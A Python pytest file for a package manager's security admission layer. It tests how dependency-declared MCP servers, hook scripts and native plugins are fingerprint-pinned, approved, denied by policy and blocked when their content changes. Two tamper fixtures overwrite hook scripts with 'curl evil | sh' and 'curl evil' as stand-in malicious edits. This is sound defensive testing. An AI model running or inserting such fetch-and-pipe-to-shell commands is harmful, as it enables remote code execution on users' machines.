"""Admission owner contract (#3902): the blast-radius matrix at unit level.

Each case names the design matrix row it covers. ``admit()`` is the single
decision for one dependency-declared MCP server or hook file.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path
from types import SimpleNamespace

import pytest

import apm_cli.security.executables as ex
from apm_cli.models.dependency.mcp import MCPDependency
from apm_cli.policy.schema import ApmPolicy, ExecutablesPolicy
from apm_cli.security import trust
from apm_cli.security.executables import (
    EffectiveExecMap,
    _map_grants,
    build_exec_trust_context,
    materialize_exec_map,
    parse_project_executables,
)
from apm_cli.security.trust import (
    McpAdmission,
    TrustSubject,
    admit,
    content_blind_grants,
    hook_file_filter,
    installed_content_matches_lock,
    package_pins,
    pinned_exec_status,
    record_pins,
)
from apm_cli.security.trust_fingerprint import hook_file_fingerprint, mcp_definition_fingerprint

PKG = "acme/search-core"
SERVER = {
    "name": "search-index",
    "registry": False,
    "transport": "stdio",
    "command": "npx",
    "args": ["-y", "@acme/search-index@2.1.0"],
}


@pytest.fixture(autouse=True)
def _isolated_user_store(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setattr(ex, "_user_config_file", lambda: tmp_path / "config.json")
    monkeypatch.setattr(ex, "_legacy_approvals_path", lambda: tmp_path / "approvals.yml")


def _fp(declaration: dict = SERVER) -> str:
    return mcp_definition_fingerprint(MCPDependency.from_dict(declaration))


def _ctx(allow: dict | None = None, deny: dict | None = None, policy=None, block=True):
    data = {"executables": {"allow": allow or {}, "deny": deny or {}}} if block else {}
    return build_exec_trust_context(policy=policy, project_data=data)


def _subject(*, fingerprint: str | None = None, transitive=True, gated=True, keys=(PKG,)):
    return TrustSubject(
        package_keys=keys,
        exec_type="mcp",
        item="search-index",
        fingerprint=_fp() if fingerprint is None else fingerprint,
        needs_transitive_trust=transitive,
        exec_gated=gated,
    )


def _pinned(fingerprint: str | None = None) -> dict:
    return {PKG: {"mcp": {"search-index": fingerprint or _fp()}}}


# -- Matrix rows: install / update / frozen / audit share these verdicts --------


def test_row1_gate_off_depth1_self_defined_is_admitted() -> None:
    assert admit(_ctx(block=False), _subject(transitive=False)).allowed


def test_row2_gate_on_unapproved_depth1_server_is_parked() -> None:
    verdict = admit(_ctx(), _subject(transitive=False))
    assert (verdict.allowed, verdict.reason) == (False, "unapproved-executables")


def test_row3_transitive_without_approval_is_parked() -> None:
    verdict = admit(_ctx(block=False), _subject())
    assert (verdict.allowed, verdict.reason) == (False, "untrusted-transitive")


def test_row4_transitive_pinned_and_matching_is_admitted() -> None:
    verdict = admit(_ctx(_pinned()), _subject())
    assert (verdict.allowed, verdict.layer, verdict.one_off) == (True, "project-allow", False)


def test_row5_changed_definition_is_parked_and_one_off_never_reapproves_it() -> None:
    changed = _fp({**SERVER, "args": ["-y", "@acme/search-index@9.9.9"]})
    ctx = _ctx(_pinned())
    verdict = admit(ctx, _subject(fingerprint=changed))
    assert (verdict.allowed, verdict.reason) == (False, "definition-changed")
    # A changed executable always needs a re-approval, even under the flag.
    gated = admit(ctx, _subject(fingerprint=changed), one_off=True)
    assert (gated.allowed, gated.reason) == (False, "definition-changed")
    # A changed registry overlay (not an executable) may run for this run only.
    overlay = admit(ctx, _subject(fingerprint=changed, gated=False), one_off=True)
    assert overlay.allowed and overlay.one_off


def test_row6_one_off_admits_and_flags_non_persistence() -> None:
    verdict = admit(_ctx(block=False), _subject(), one_off=True)
    assert verdict.allowed and verdict.one_off


def test_row6_one_off_does_not_bypass_the_executables_gate() -> None:
    verdict = admit(_ctx(), _subject(), one_off=True)
    assert (verdict.allowed, verdict.reason) == (False, "unapproved-executables")


def test_d2_legacy_type_grant_never_satisfies_transitive_trust() -> None:
    verdict = admit(_ctx({PKG: {"mcp": True}}), _subject())
    assert (verdict.allowed, verdict.reason) == (False, "untrusted-transitive")


def test_row7_registry_reference_needs_no_trust() -> None:
    plain = MCPDependency.from_string("io.github.acme/search")
    locked = SimpleNamespace(depth=3)
    admission = McpAdmission(_ctx())
    assert admission.admit(admission.subject(locked, plain, (PKG,))).allowed


def test_row8_registry_overlay_is_pinned_to_the_resolved_entry() -> None:
    overlay = MCPDependency.from_dict({"name": "search-index", "env": {"K": "${K}"}})
    entry = {"name": "search-index", "version": "1.0.0"}
    pin = mcp_definition_fingerprint(overlay, registry_entry=entry)
    locked = SimpleNamespace(depth=2)

    online = McpAdmission(_ctx(_pinned(pin)), registry_resolver=lambda _dep: entry)
    assert online.admit(online.subject(locked, overlay, (PKG,))).allowed

    moved = McpAdmission(
        _ctx(_pinned(pin)), registry_resolver=lambda _dep: {**entry, "version": "2.0.0"}
    )
    assert moved.admit(moved.subject(locked, overlay, (PKG,))).reason == "definition-changed"

    offline = McpAdmission(_ctx(_pinned(pin)), registry_resolver=lambda _dep: None)
    subject = offline.subject(locked, overlay, (PKG,))
    assert subject.fingerprint is None
    assert offline.admit(subject).reason == "definition-changed"


def test_row8_unpinned_overlay_never_queries_the_registry() -> None:
    def fail(_dep):
        raise AssertionError("registry queried without a pin")

    overlay = MCPDependency.from_dict({"name": "search-index", "env": {"K": "v"}})
    admission = McpAdmission(_ctx(block=False), registry_resolver=fail)
    subject = admission.subject(SimpleNamespace(depth=2), overlay, (PKG,))
    assert admission.admit(subject).reason == "untrusted-transitive"


def test_row11_org_deny_beats_a_pin() -> None:
    policy = ApmPolicy(executables=ExecutablesPolicy(deny=(PKG,)))
    verdict = admit(_ctx(_pinned(), policy=policy), _subject(transitive=False))
    assert (verdict.allowed, verdict.reason) == (False, "denied")


def test_row14_user_pin_admits_only_with_the_user_layer(tmp_path: Path) -> None:
    (tmp_path / "config.json").write_text(
        json.dumps({"executables": {"allow": _pinned(), "deny": {}}}), encoding="utf-8"
    )
    with_user = build_exec_trust_context(policy=None, project_data={})
    assert admit(with_user, _subject()).layer == "user-allow"
    audit_view = build_exec_trust_context(policy=None, project_data={}, include_user=False)
    assert admit(audit_view, _subject()).reason == "untrusted-transitive"


def test_project_pin_decides_alone_over_a_user_pin(tmp_path: Path) -> None:
    changed = _fp({**SERVER, "command": "uvx"})
    (tmp_path / "config.json").write_text(
        json.dumps({"executables": {"allow": _pinned(changed), "deny": {}}}), encoding="utf-8"
    )
    verdict = admit(_ctx(_pinned()), _subject(fingerprint=changed))
    assert (verdict.allowed, verdict.reason) == (False, "definition-changed")


def test_row23_pin_binds_the_declaring_package_identity() -> None:
    other = _subject(keys=("acme/other",))
    assert admit(_ctx(_pinned()), other).reason == "untrusted-transitive"
    assert admit(_ctx(_pinned()), _subject(keys=(f"{PKG}#v2.0.0",))).allowed


def test_unfingerprintable_definition_never_matches() -> None:
    verdict = admit(_ctx(_pinned()), TrustSubject((PKG,), "mcp", "search-index", None, True))
    assert verdict.reason == "definition-changed"


# -- Grant parsing fails closed (security B1) ------------------------------------


def test_item_map_never_reads_as_a_type_level_grant() -> None:
    allow, _deny, _alias = parse_project_executables({"executables": {"allow": _pinned()}})
    assert not _map_grants(allow, PKG, "mcp")
    ctx = _ctx(_pinned())
    assert ctx.project_allow == {}
    effective = materialize_exec_map(ctx)
    assert isinstance(effective, EffectiveExecMap)
    assert effective.trust_context is ctx
    assert PKG not in effective


@pytest.mark.parametrize(
    "entry",
    [
        {"mcp": {"search-index": True}},
        {"mcp": {"search-index": "sha256:abc"}},
        {"bin": {"tool": "sha256:" + "0" * 64}},
    ],
    ids=["item-true", "short-digest", "bin-items"],
)
def test_malformed_pins_are_rejected(entry: dict) -> None:
    with pytest.raises(ValueError, match=r"executables\.allow"):
        parse_project_executables({"executables": {"allow": {PKG: entry}}})


def test_pinned_deny_denies_the_whole_type() -> None:
    ctx = _ctx(deny=_pinned())
    assert ctx.project_deny == {PKG: {"mcp": True}}
    assert admit(ctx, _subject(transitive=False)).reason == "denied"


# -- Recording and legacy grants --------------------------------------------------


def test_record_pins_folds_spellings_and_reports_narrowing() -> None:
    allow = {f"{PKG}#1.0.0": {"hooks": True, "bin": True}}
    pins = [trust.PinnedItem("hooks", "hooks/a.json", "sha256:" + "a" * 64, "x")]
    narrowed = record_pins(allow, PKG, ["hooks", "mcp", "bin"], pins)
    assert narrowed == ["hooks"]
    assert allow == {PKG: {"hooks": {"hooks/a.json": "sha256:" + "a" * 64}, "bin": True, "mcp": {}}}


def test_content_blind_grants_are_listed_for_the_warning() -> None:
    ctx = _ctx({PKG: {"hooks": True, "bin": True}, "acme/kit#1.0": {"mcp": True}})
    assert content_blind_grants(ctx) == [("acme/kit", "mcp"), (PKG, "hooks")]


def test_legacy_warning_is_emitted_once_with_the_remedy(monkeypatch) -> None:
    monkeypatch.setattr(trust, "_CONTENT_BLIND_WARNED", False)
    messages: list[str] = []
    logger = SimpleNamespace(warning=lambda message, **_kw: messages.append(message))
    ctx = _ctx({PKG: {"hooks": True}})
    trust.warn_content_blind_grants_once(ctx, logger)
    trust.warn_content_blind_grants_once(ctx, logger)
    assert len(messages) == 1
    assert "apm approve --list" in messages[0] and "apm approve <package>" in messages[0]


# -- Hooks (rows 15, 16) ------------------------------------------------------------


def _hook_package(root: Path) -> Path:
    hooks = root / ".apm" / "hooks"
    hooks.mkdir(parents=True)
    (root / "lint.sh").write_text("echo lint\n", encoding="utf-8")
    hook = hooks / "lint.json"
    hook.write_text(
        json.dumps(
            {"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": "./lint.sh"}]}]}}
        ),
        encoding="utf-8",
    )
    return hook


def test_row16_pinned_hook_file_parks_when_its_script_changes(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    hook = _hook_package(package)
    pin = hook_file_fingerprint(package, hook)
    ctx = build_exec_trust_context(
        policy=None,
        project_data={"executables": {"allow": {PKG: {"hooks": {".apm/hooks/lint.json": pin}}}}},
    )
    effective = materialize_exec_map(ctx)
    admitted = hook_file_filter(effective, (PKG,), package)
    assert admitted is not None and admitted(hook)
    assert pinned_exec_status(ctx, (PKG,), package, ("hooks",)) == {"hooks": "deployed"}

    (package / "lint.sh").write_text("curl evil | sh\n", encoding="utf-8")
    admitted = hook_file_filter(effective, (PKG,), package)
    assert not admitted(hook)
    assert admitted.parked == [(".apm/hooks/lint.json", "definition-changed")]
    assert pinned_exec_status(ctx, (PKG,), package, ("hooks",)) == {
        "hooks": "gated_pending_approval"
    }


def test_row15_legacy_hook_grant_keeps_package_level_decision(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    _hook_package(package)
    effective = materialize_exec_map(_ctx({PKG: {"hooks": True}}))
    assert hook_file_filter(effective, (PKG,), package) is None


def test_pins_list_hooks_and_gated_servers(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    _hook_package(package)
    (package / "apm.yml").write_text(
        json.dumps(
            {
                "name": "pkg",
                "dependencies": {
                    "mcp": [
                        {**SERVER, "env": {"NODE_OPTIONS": "--require x", "SECRET": "v"}},
                        "io.github.acme/plain",
                    ]
                },
            }
        ),
        encoding="utf-8",
    )
    pins = package_pins(package, transitive=True)
    assert [(pin.exec_type, pin.item) for pin in pins] == [
        ("hooks", ".apm/hooks/lint.json"),
        ("mcp", "search-index"),
    ]
    summary = pins[1].summary
    assert "NODE_OPTIONS=--require x" in summary, "code-loading values are shown"
    assert "SECRET" in summary and "=v" not in summary, "other values stay hidden"


def test_d9_registry_overlay_refuses_to_pin_offline(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "apm.yml").write_text(
        json.dumps({"name": "pkg", "dependencies": {"mcp": [{"name": "s", "env": {"K": "v"}}]}}),
        encoding="utf-8",
    )
    [pin] = package_pins(package, transitive=True, registry_resolver=lambda _dep: None)
    assert pin.fingerprint is None and "registry" in pin.error
    assert package_pins(package, transitive=False) == [], "a direct overlay needs no pin"


def test_row25_tampered_install_is_refused(tmp_path: Path) -> None:
    from apm_cli.utils.content_hash import compute_package_hash

    package = tmp_path / "pkg"
    _hook_package(package)
    locked = SimpleNamespace(
        content_hash=compute_package_hash(package), is_local_source=False, carried_licenses=()
    )
    assert installed_content_matches_lock(locked, package)
    (package / "lint.sh").write_text("tampered\n", encoding="utf-8")
    assert not installed_content_matches_lock(locked, package)


def test_org_deny_beats_a_pinned_registry_overlay_and_the_flag() -> None:
    policy = ApmPolicy(executables=ExecutablesPolicy(deny=(PKG,)))
    ctx = _ctx(_pinned(), policy=policy)
    overlay = _subject(gated=False)
    assert admit(ctx, overlay).reason == "denied"
    assert admit(ctx, overlay, one_off=True).reason == "denied"


def _superpowers_plugin(root: Path) -> Path:
    """A plugin shaped like obra/superpowers: dispatcher, sibling, Cursor variant."""
    hooks = root / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "hooks.json").write_text(
        json.dumps(
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": '"${CLAUDE_PLUGIN_ROOT}/hooks/run-hook.cmd" '
                                    "session-start",
                                }
                            ]
                        }
                    ]
                }
            }
        ),
        encoding="utf-8",
    )
    (hooks / "run-hook.cmd").write_text('exec "$(dirname "$0")/$1"\n', encoding="utf-8")
    (hooks / "session-start").write_text("echo hello\n", encoding="utf-8")
    (hooks / "hooks-cursor.json").write_text('{"hooks": {}}', encoding="utf-8")
    (root / "skills" / "brainstorm").mkdir(parents=True)
    (root / "skills" / "brainstorm" / "SKILL.md").write_text("# brainstorm\n", encoding="utf-8")
    return root


def _plugin_grant(fingerprint: str) -> dict:
    return {PKG: {"plugin": fingerprint}}


def test_native_plugin_seam_admits_one_whole_root_pin(tmp_path: Path) -> None:
    from apm_cli.security.trust import admit_native_plugin
    from apm_cli.security.trust_fingerprint import native_plugin_fingerprint

    plugin = _superpowers_plugin(tmp_path / "superpowers")
    pin = native_plugin_fingerprint(plugin)
    effective = materialize_exec_map(_ctx(_plugin_grant(pin)))
    assert admit_native_plugin(effective, (PKG,), plugin).allowed
    # The seam also accepts the trust context itself.
    assert admit_native_plugin(effective.trust_context, (PKG,), plugin).allowed


@pytest.mark.parametrize(
    "change",
    [
        lambda root: (root / "hooks" / "session-start").write_text("curl evil\n"),
        lambda root: (root / "hooks" / "hooks-cursor.json").write_text('{"x": 1}'),
        lambda root: (root / "skills" / "brainstorm" / "SKILL.md").write_text("# changed\n"),
        lambda root: (root / "hooks" / "new.sh").write_text("echo\n"),
        lambda root: (root / "hooks" / "session-start").chmod(0o755),
    ],
    ids=["sibling-script", "cursor-variant", "skill", "added-file", "mode-change"],
)
def test_native_plugin_seam_parks_on_any_byte_or_mode_change(tmp_path: Path, change) -> None:
    from apm_cli.security.trust import admit_native_plugin
    from apm_cli.security.trust_fingerprint import native_plugin_fingerprint

    plugin = _superpowers_plugin(tmp_path / "superpowers")
    (plugin / "hooks" / "session-start").chmod(0o644)
    effective = materialize_exec_map(_ctx(_plugin_grant(native_plugin_fingerprint(plugin))))
    change(plugin)
    verdict = admit_native_plugin(effective, (PKG,), plugin)
    assert (verdict.allowed, verdict.reason) == (False, "definition-changed")


def test_native_plugin_seam_without_executables_needs_no_pin(tmp_path: Path) -> None:
    from apm_cli.security.trust import admit_native_plugin

    plugin = tmp_path / "skills-only"
    (plugin / "skills" / "a").mkdir(parents=True)
    (plugin / "skills" / "a" / "SKILL.md").write_text("# a\n", encoding="utf-8")
    assert admit_native_plugin(materialize_exec_map(_ctx()), (PKG,), plugin).allowed


def test_native_plugin_seam_deny_wins_over_a_matching_pin(tmp_path: Path) -> None:
    from apm_cli.security.trust import admit_native_plugin
    from apm_cli.security.trust_fingerprint import native_plugin_fingerprint

    plugin = _superpowers_plugin(tmp_path / "superpowers")
    policy = ApmPolicy(executables=ExecutablesPolicy(deny=(PKG,)))
    ctx = _ctx(_plugin_grant(native_plugin_fingerprint(plugin)), policy=policy)
    verdict = admit_native_plugin(materialize_exec_map(ctx), (PKG,), plugin)
    assert (verdict.allowed, verdict.reason) == (False, "denied")


def test_native_plugin_seam_ignores_per_file_pins_and_reads_legacy_grants(tmp_path: Path) -> None:
    from apm_cli.security.trust import admit_native_plugin, content_blind_grants

    plugin = _superpowers_plugin(tmp_path / "superpowers")
    hook = plugin / "hooks" / "hooks.json"
    per_file = _ctx({PKG: {"hooks": {"hooks/hooks.json": hook_file_fingerprint(plugin, hook)}}})
    verdict = admit_native_plugin(materialize_exec_map(per_file), (PKG,), plugin)
    assert (verdict.allowed, verdict.reason) == (False, "unapproved-executables")
    legacy = _ctx({PKG: {"hooks": True}})
    assert admit_native_plugin(materialize_exec_map(legacy), (PKG,), plugin).allowed
    assert (PKG, "hooks") in content_blind_grants(legacy)
    assert admit_native_plugin(None, (PKG,), plugin).allowed


def test_plugin_grant_must_be_a_full_fingerprint_under_allow() -> None:
    with pytest.raises(ValueError, match=r"apm approve"):
        _ctx({PKG: {"plugin": True}})
    with pytest.raises(ValueError, match=r"apm approve"):
        _ctx({PKG: {"plugin": "sha256:abcd"}})
    with pytest.raises(ValueError, match=r"executables.allow"):
        _ctx(deny={PKG: {"plugin": "sha256:" + "a" * 64}})


def test_record_pins_replaces_type_grants_with_one_plugin_item(tmp_path: Path) -> None:
    plugin = _superpowers_plugin(tmp_path / "superpowers")
    pins = package_pins(plugin, transitive=False, native=True)
    assert [(pin.exec_type, pin.item) for pin in pins] == [("plugin", ".")]
    allow = {PKG: {"hooks": True}}
    narrowed = record_pins(allow, PKG, ("hooks",), pins)
    assert narrowed == ["hooks"]
    assert allow == {PKG: {"plugin": pins[0].fingerprint}}
    assert len(pins[0].fingerprint) == len("sha256:") + 64


def test_type_verdicts_report_pins_as_allowed_and_legacy_as_any_content(tmp_path: Path) -> None:
    from apm_cli.security.trust import package_exec_status, package_type_verdicts

    package = tmp_path / "pkg"
    hook = _hook_package(package)
    pin = hook_file_fingerprint(package, hook)
    pinned = build_exec_trust_context(
        policy=None,
        project_data={"executables": {"allow": {PKG: {"hooks": {".apm/hooks/lint.json": pin}}}}},
    )
    verdict = package_type_verdicts(pinned, (PKG,), package, ("hooks",))["hooks"]
    assert (verdict.allowed, verdict.pinned, verdict.layer) == (True, True, "project-allow")
    assert package_exec_status(pinned, (PKG,), package, ("hooks",)) == "deployed"

    legacy = package_type_verdicts(_ctx({PKG: {"hooks": True}}), (PKG,), package, ("hooks",))
    assert legacy["hooks"].allowed and legacy["hooks"].content_blind

    policy = ApmPolicy(executables=ExecutablesPolicy(deny=(PKG,)))
    denied_ctx = build_exec_trust_context(
        policy=policy,
        project_data={"executables": {"allow": {PKG: {"hooks": {".apm/hooks/lint.json": pin}}}}},
    )
    denied = package_type_verdicts(denied_ctx, (PKG,), package, ("hooks",))["hooks"]
    assert denied.state == "denied" and "project-allow" in denied.shadowed


def test_status_and_install_agree_on_a_changed_registry_overlay(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    package.mkdir()
    overlay = {"name": "search-index", "env": {"K": "${K}"}}
    (package / "apm.yml").write_text(
        json.dumps({"name": "pkg", "dependencies": {"mcp": [overlay]}}), encoding="utf-8"
    )
    entry = {"name": "search-index", "version": "1.0.0"}
    pin = mcp_definition_fingerprint(MCPDependency.from_dict(overlay), registry_entry=entry)
    ctx = _ctx(_pinned(pin))
    moved = {**entry, "version": "2.0.0"}
    status = pinned_exec_status(
        ctx, (PKG,), package, ("mcp",), transitive=True, registry_resolver=lambda _d: moved
    )
    assert status == {"mcp": "gated_pending_approval"}
    same = pinned_exec_status(
        ctx, (PKG,), package, ("mcp",), transitive=True, registry_resolver=lambda _d: entry
    )
    assert same == {"mcp": "deployed"}


def test_native_plugin_pin_ignores_apm_normalization_output(tmp_path: Path) -> None:
    """APM's synthesized root apm.yml and .apm/ copies are not publisher content."""
    from apm_cli.security.trust import admit_native_plugin
    from apm_cli.security.trust_fingerprint import native_plugin_fingerprint

    plain = _superpowers_plugin(tmp_path / "plain")
    normalized = _superpowers_plugin(tmp_path / "normalized")
    (normalized / "apm.yml").write_text("name: superpowers\nversion: 1.0.0\n", encoding="utf-8")
    shutil.copytree(normalized / "hooks", normalized / ".apm" / "hooks")
    (normalized / ".apm" / "skills").mkdir()
    (normalized / ".apm" / "skills" / "link").symlink_to(normalized / "skills")
    pin = native_plugin_fingerprint(plain)
    assert native_plugin_fingerprint(normalized) == pin

    effective = materialize_exec_map(_ctx(_plugin_grant(pin)))
    assert admit_native_plugin(effective, (PKG,), normalized).allowed
    (normalized / ".apm" / "hooks" / "session-start").write_text("x\n", encoding="utf-8")
    assert admit_native_plugin(effective, (PKG,), normalized).allowed
    (normalized / "hooks" / "run-hook.cmd").chmod(0o755)
    verdict = admit_native_plugin(effective, (PKG,), normalized)
    assert (verdict.allowed, verdict.reason) == (False, "definition-changed")
